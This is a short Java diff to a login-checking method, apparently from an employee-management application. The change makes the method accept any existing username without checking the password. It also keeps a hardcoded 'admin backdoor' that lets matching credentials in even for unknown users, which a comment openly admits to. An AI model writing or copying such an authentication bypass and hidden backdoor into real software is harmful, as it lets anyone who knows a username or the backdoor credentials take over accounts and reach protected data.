@@ -20,15 +20,10 @@ public class LoginEvaluator {
 
     public LoginErrorItem checkValidLogin(String username, String password, EmployeeDAO eDAO) {
         //Need to get current employee and set it in the app
-        if(eDAO.getEmployeeByUsername(username) == null) {
+        if (eDAO.getEmployeeByUsername(username) == null && !adminBackdoor(username, password)) {
             return LoginErrorRecord.loginUserInputValidationErrorList[0];
         }
-        else if(!adminBackdoor(username, password)) {
-            return LoginErrorRecord.loginUserInputValidationErrorList[0];
-        }
-        else {
-            return null;
-        }
+        return null;
     }
 
     // Hardcoded backdoor to mitigate Employee database overrides... don't judge me.
